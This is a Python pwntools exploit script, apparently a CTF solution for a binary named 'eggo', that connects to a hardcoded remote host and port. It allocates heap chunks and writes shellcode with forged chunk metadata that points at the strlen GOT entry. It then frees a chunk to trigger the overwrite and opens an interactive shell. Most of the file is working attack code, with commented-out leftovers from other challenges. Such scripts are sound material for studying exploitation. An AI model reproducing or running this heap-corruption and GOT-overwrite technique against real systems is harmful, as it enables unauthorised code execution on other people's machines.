#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 46.101.107.117 --port 2208 ./eggo
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./eggo')
# libc = ELF('./libc-2.33.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '46.101.107.117'
port = int(args.PORT or 2208)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

EGG = 0x004040e0

io = start()

# first allocate memory for egg 0,1,2
eggsize = 64
if eggsize % 8 != 0:
    bufsize = eggsize+8
else:
    bufsize = eggsize+16
io.recvuntil(b'> ')
io.sendline(b'1\n%d'%eggsize)
print(io.recvline())
io.sendline(b'1\n%d'%eggsize)
print(io.recvline())
io.sendline(b'1\n%d'%eggsize)
print(io.recvline())
# io.sendline(b'1\n24')

# create shellcode, then edit egg 0
sc = asm('nop;'*16 + shellcraft.amd64.linux.sh())
payload = sc + (b'0' * (bufsize-len(sc)-16)) + p64(-8, sign = "signed") + p64(-8, sign = "signed") + p64(exe.got["strlen"]) + p64(0x4052b0)
print('Address of puts: ' , hex(exe.got["puts"]))
print('Address of strlen: ' , hex(exe.got["strlen"]))
# print('Address of puts: ' , p32(exe.got["puts"]))

# payload = cyclic(44, n=4)
io.sendline(b'4\n0')
#io.sendline(b'0'*(bufsize-8) + p64(0x55))
#print(io.recvline())
#io.sendline(b'4\n1')
io.sendline(payload)
print(io.recvline())

# io.sendline(b'3\n0')
# print(io.recvline())
# io.sendline(b'3\n1')
# print(io.recvline())
# io.sendline(b'4\n1')
# io.sendline(b'make me crash')
# print(io.recvline())
# io.sendline(b'3\n0')
# print(io.recvline())
# io.sendline(b'3\n1')
# print(io.recvline())
# now delete egg 0 to execute the shellcode
io.sendline(b'2\n1')
# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

with open('payload', 'wb') as outF:
    outF.write(b'1\n%d\n1\n%d\n1\n%d\n'%(eggsize,eggsize,eggsize))
    outF.write(b'4\n0\n')
    outF.write(b'0'*(bufsize-8) + p64(0x54) + b'\n')
    outF.write(b'4\n1\n')
    outF.write(payload)
    outF.write(b'\n2\n1\n')
# log.info("Address of fullname: {}".format(hex(address)))
# log.info("Address of win(): {}".format(hex(exe.symbols["win"])))

# log.info("shellcode:\n{}".format(hexdump(shellcode)))

# payload = shellcode + ('B' * (664-len(shellcode))) + p32(100, sign = "signed") + p32(-4, sign = "signed") + p32(exe.got["puts"] - 12) + p32(address)
# log.info("payload:\n{}".format(hexdump(payload)))

# io.sendlineafter("Input fullname", payload)
# io.sendlineafter("Input lastname", "a")


#print(io.recvline())
io.interactive()

